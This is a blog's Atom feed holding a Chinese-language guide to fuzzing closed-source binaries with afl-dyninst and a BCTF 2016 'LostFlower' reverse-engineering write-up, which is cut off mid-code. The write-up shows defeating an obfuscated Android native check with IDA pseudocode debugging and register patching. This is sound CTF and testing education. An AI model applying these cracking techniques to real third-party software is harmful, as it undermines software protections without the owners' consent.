<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ele7enxxh&#39;s Blog</title>
  <subtitle>For you, a thousand times over</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ele7enxxh.com/"/>
  <updated>2016-09-14T03:48:24.000Z</updated>
  <id>http://ele7enxxh.com/</id>
  
  <author>
    <name>ele7enxxh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用afl-dyninst fuzz无源码的二进制程序</title>
    <link href="http://ele7enxxh.com/Use-Afl-dyninst-To-Fuzz-Blackbox-Binaries.html"/>
    <id>http://ele7enxxh.com/Use-Afl-dyninst-To-Fuzz-Blackbox-Binaries.html</id>
    <published>2016-09-14T03:40:00.000Z</published>
    <updated>2016-09-14T03:48:24.000Z</updated>
    
    <content type="html">&lt;p&gt;通常来讲,afl-fuzz需要对待fuzz程序重编译,重而对其进行插桩,这就要求拥有待fuzz程序的完整源代码。而afl-dyninst提供了一种静态无源码插桩的手段使得可以对无源码二进制程序插桩。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文的测试系统为:ubuntu14.04。&lt;/p&gt;
&lt;h2 id=&quot;下载-amp-amp-编译&quot;&gt;&lt;a href=&quot;#下载-amp-amp-编译&quot; class=&quot;headerlink&quot; title=&quot;下载&amp;amp;&amp;amp;编译&quot;&gt;&lt;/a&gt;下载&amp;amp;&amp;amp;编译&lt;/h2&gt;&lt;p&gt;首先需要安装以下软件:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install libelf-dev libelf1 libiberty-dev libboost-all-dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;afl-dyninst是基于dyninst的,所以需要下载&amp;amp;&amp;amp;编译&amp;amp;&amp;amp;安装dyninst:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/dyninst/dyninst.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd dyninst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mkdir build&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd build&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmake -DBOOST_LIBRARYDIR=/usr/lib/x86_64-linux-gnu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;下载&amp;amp;&amp;amp;编译afl-dyninst&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/talos-vulndev/afl-dyninst.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd afl-dyninst&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo cp afl-dyninst /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo cp libAflDyninst.so /usr/local/lib/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;quot;/usr/local/lib&amp;quot; &amp;gt; /etc/ld.so.conf.d/dyninst.conf &amp;amp;&amp;amp; ldconfig&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;quot;export DYNINSTAPI_RT_LIB=/usr/local/lib/libdyninstAPI_RT.so&amp;quot; &amp;gt;&amp;gt; ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Usage: ./afl-dyninst -i &amp;lt;binary&amp;gt; -o &amp;lt;binary&amp;gt; -l &amp;lt;library&amp;gt; -e &amp;lt;address&amp;gt; -s &amp;lt;number&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -i: Input binary &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -o: Output binary&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -l: Library to instrument (repeat for more than one)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -e: Entry point address to patch (required for stripped binaries)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -r: Runtime library to instrument (path to, repeat for more than one)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -s: Number of basic blocks to skip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             -v: Verbose output&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;example:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;afl-dyninst -i testbin -o testbin_ins&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;to fuzz:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export AFL_SKIP_BIN_CHECK=1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;afl-fuzz -i in -o out testbin_ins&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;碎碎念&quot;&gt;&lt;a href=&quot;#碎碎念&quot; class=&quot;headerlink&quot; title=&quot;碎碎念&quot;&gt;&lt;/a&gt;碎碎念&lt;/h2&gt;&lt;p&gt;dyninst目前支持POWER/Linux, x86/Linux, x86_64/Linux,x86/Windows XP/2000/2003/Windows 7多个平台以及aarch64,不过可惜的是不支持arm/thumb。afl-dyninst于15年3月公布,不过到目前为止还未添加到afl-fuzz的发行版本中,推测其应该存在较多的bug。不过dyninst项目目前仍然活跃,相信以后会更加成熟。持续关注中!&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;通常来讲,afl-fuzz需要对待fuzz程序重编译,重而对其进行插桩,这就要求拥有待fuzz程序的完整源代码。而afl-dyninst提供了一种静态无源码插桩的手段使得可以对无源码二进制程序插桩。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>bctf 2016 LostFlower writeup</title>
    <link href="http://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html"/>
    <id>http://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html</id>
    <published>2016-03-23T04:50:00.000Z</published>
    <updated>2016-03-23T06:30:35.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为2016年bctf中的LostFlower的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/bctf-2016-LostFlower-writeup-1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;LostFlower-writeup&quot;&gt;&lt;a href=&quot;#LostFlower-writeup&quot; class=&quot;headerlink&quot; title=&quot;LostFlower writeup&quot;&gt;&lt;/a&gt;LostFlower writeup&lt;/h2&gt;&lt;p&gt;首先&lt;a href=&quot;/downloads/bctf-2016-LostFlower.zip&quot;&gt;点我&lt;/a&gt;下载题目，直接使用jeb反编译，入口代码如下：&lt;br&gt;&lt;img src=&quot;/images/bctf-2016-LostFlower-writeup-2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;可以看到，Java逻辑十分简单，首先获取用户输入，然后调用&lt;code&gt;Double.parseDouble&lt;/code&gt;将其转为Double类型（这意味着输入数据必须为合法的Double数据），接着将其作为参数传递给native层的&lt;code&gt;stringFromJNI&lt;/code&gt;，如果返回值为6，则调用&lt;code&gt;stringFromJNI2&lt;/code&gt;，其返回值即为Flag。&lt;br&gt;使用IDA反汇编，结果如下：&lt;br&gt;&lt;img src=&quot;/images/bctf-2016-LostFlower-writeup-3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;可以看到，SO进行了高强度的混淆，加入了大量的while、if等无用指令。&lt;br&gt;对&lt;code&gt;stringFromJNI&lt;/code&gt;使用f5，奇怪的是，经过对f5伪代码的分析，并没有发现有对用户输入进行校验的地方，难道是程序做了处理，导致f5出现了错误？静态分析解决不了，我们就用动态调试。SO没有做任何反调试处理，而且发现动态调试时，&lt;code&gt;stringFromJNI&lt;/code&gt;的f5可以得到正确的伪代码。&lt;br&gt;由于汇编代码含有大量的无效跳转，因此我们选择直接在伪代码的基础上进行动态调试，经过几轮动态调试，发现&lt;code&gt;stringFromJNI&lt;/code&gt;包含3处关键代码（即有对输入数据进行判断或处理的地方），如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第68行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v59 = a4; &lt;span class=&quot;comment&quot;&gt;// a4为输入值的小数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v58 = a3; &lt;span class=&quot;comment&quot;&gt;// a3为输入值的整数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v67 = _stack_chk_guard;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v60 = j_j___aeabi_d2iz(a3, a4);   &lt;span class=&quot;comment&quot;&gt;// v60为输入值的整数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第112行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (&lt;span class=&quot;keyword&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)v6 &amp;gt; &lt;span class=&quot;number&quot;&gt;814185195&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v6 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;814185196&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v6 = &amp;amp;unk_60130C76;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v65 &amp;lt;= &lt;span class=&quot;number&quot;&gt;1000000000&lt;/span&gt; )  &lt;span class=&quot;comment&quot;&gt;// v65为输入值的整数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v6 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;306644219&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;···&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第398行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v13 = check1(*v62);   &lt;span class=&quot;comment&quot;&gt;// *v62为输入值的整数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v14 = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( !v13 )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v14 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v63 = v14;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v4 = (&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-439993678&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v4 == (&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-439993678&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v9 = (&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; __int8)v63;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v4 = (&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *)&amp;amp;unk_662944DE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;goto&lt;/span&gt; LABEL_49;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从上面的代码我们可以得出以下3点结论：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;stringFromJNI&lt;/code&gt;只对输入Double数据的整数部分做处理。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stringFromJNI&lt;/code&gt;将整数部分和1000000000做比较，根据大小不同，进入不同的分支。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stringFromJNI&lt;/code&gt;调用了&lt;code&gt;check1&lt;/code&gt;，参数为整数部分，根据返回值是否为1，进入不同的分支。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;现在我们开始脑洞一番，一般情况下，我们测试的时候，不会输入一个大于1000000000的数据，基于这一点我们猜测输入数据应大于1000000000；程序员的逻辑中，返回1是真，0是假，因此我们猜测&lt;code&gt;check1&lt;/code&gt;的返回应为1。现在我们测试一番，首先在check1的后面一行下断点，接着输入一个大于1000000000的数据，如1000000001，点击提交按钮，程序断下来以后，可以看到r0为0，修改r0为1，最后让程序继续运行，可以发现，程序成功打印出了Flag，然而由于我们是直接修改的返回值，而输入依然是错误的，自然这个Flag也是错误的。不过，可以确定的是我们的猜测是正确的，即输入数据应大于1000000000并且&lt;code&gt;check1&lt;/code&gt;的返回值为1。因此现在的关键即为分析&lt;code&gt;check1&lt;/code&gt;，同样在动态分析时，对&lt;code&gt;check1&lt;/code&gt;进行f5得到伪代码，&lt;code&gt;check1&lt;/code&gt;的逻辑要更加简单一点，我们可以直接采用逆推的方法，也就是从出口（return）开始，往函数入口方向逆向推理的过程。逆推过程这里不再详述，只需要注意以下3点即可加快效率：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不要在意大于或小于的比较，我们只需要关注等于时的分支。&lt;/li&gt;
&lt;li&gt;在IDA里，你可以选择一个值，此时所有这个值都会标黄，从而可以快速找到下一个值。&lt;/li&gt;
&lt;li&gt;我们可以直接在IDA f5伪代码里下断点，也就是说可以直接以伪代码级别调试。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;给出逆推的结果，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第134行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-427046904&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;LABEL_15:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;196778168&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LOBYTE(v1) = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 2）就是这里，v1赋值为1了，也就是说我们要找到v2 = -427046904的地方。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    